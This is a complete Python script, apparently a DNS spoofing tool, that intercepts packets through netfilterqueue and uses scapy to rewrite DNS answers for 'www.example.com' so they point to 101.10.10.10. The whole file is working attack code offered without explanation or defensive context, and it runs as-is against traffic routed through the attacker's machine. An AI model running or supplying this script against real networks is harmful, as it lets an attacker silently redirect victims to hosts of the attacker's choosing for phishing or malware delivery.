#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # decode bytes to string
        if "www.example.com" in qname:
            print("[+] Spoofing target")
            
            # Build the DNS response
            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata="101.10.10.10")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Remove length and checksum fields so Scapy recalculates them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the modified packet
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
